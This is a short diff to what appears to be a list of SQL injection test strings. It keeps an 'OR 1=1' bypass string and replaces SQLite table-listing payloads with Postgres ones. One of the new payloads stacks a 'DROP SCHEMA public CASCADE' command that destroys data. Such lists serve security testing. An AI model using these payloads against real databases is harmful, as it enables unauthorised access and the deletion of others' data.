@@ -1,6 +1,3 @@
-# SQLite
-
 User' OR 1=1 OR name='something
-User'; SELECT name FROM my_db.sqlite_master WHERE type='table
-
-# Postgres
+User'; SELECT * FROM pg_catalog.pg_tables WHERE 1=1 OR tableowner='something
+User'; DROP SCHEMA public CASCADE; SELECT * FROM pg_catalog.pg_tables WHERE 1=1 OR tableowner='something
